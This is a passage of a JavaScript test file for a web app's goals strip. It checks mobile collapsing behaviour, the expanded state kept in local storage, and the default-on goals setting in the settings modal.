  assert.equal(m2.host.querySelectorAll('[data-goal]').length, 6);
  assert.equal(localStorage.getItem('kwnt.goals.open'), '1');
  localStorage.removeItem('kwnt.goals.open');
  m2.done();
});

test('on a phone, with all goals well, the strip is one line until opened; something needing you opens it', async () => {
  const had = Object.getOwnPropertyDescriptor(window, 'matchMedia');
  window.matchMedia = (q) => ({ matches: q === '(max-width: 639px)', addEventListener() {}, removeEventListener() {} });
  try {
    const api = fakeApi([]);
    const well = [goal({ id: 'a' }), goal({ id: 'b', title: 'Second' })];
    const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: well } });
    assert.equal(m.host.querySelectorAll('[data-goal]').length, 0);
    assert.match(m.q('[data-goal-counts]').textContent, /2 goals · 2 met/);
    assert.equal(m.q('[data-goals-toggle]').getAttribute('aria-expanded'), 'false');
    m.done();
    const m2 = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: [...well, goal({ id: 'c', status: 'needs_you' })] } });
    assert.equal(m2.host.querySelectorAll('[data-goal]').length, 3);
    m2.done();
  } finally {
    if (had) Object.defineProperty(window, 'matchMedia', had);
    else delete window.matchMedia;
  }
});

test('the board shows Goals on All work only, and Settings saves the switch (on by default)', () => {
  const board = readFileSync(new URL('../src/components/MissionBoardView.tsx', import.meta.url), 'utf8');
  assert.match(board, /\{!missionId && <GoalsStrip /);
  const settings = readFileSync(new URL('../src/components/SettingsModal.tsx', import.meta.url), 'utf8');
  assert.match(settings, /parseGoalsSetting\(data\) \?\? true/, 'a missing value reads as on');
  assert.match(settings, /\.\.\.\(goals !== null \? \{ goals \} : \{\}\)/);
  assert.match(settings, /GOALS_SETTING_EVENT, \{ detail: goals \}/);
  assert.equal(b.parseGoalsSetting({ goals: false }), false);
  assert.equal(b.parseGoalsSetting({}), null);
});
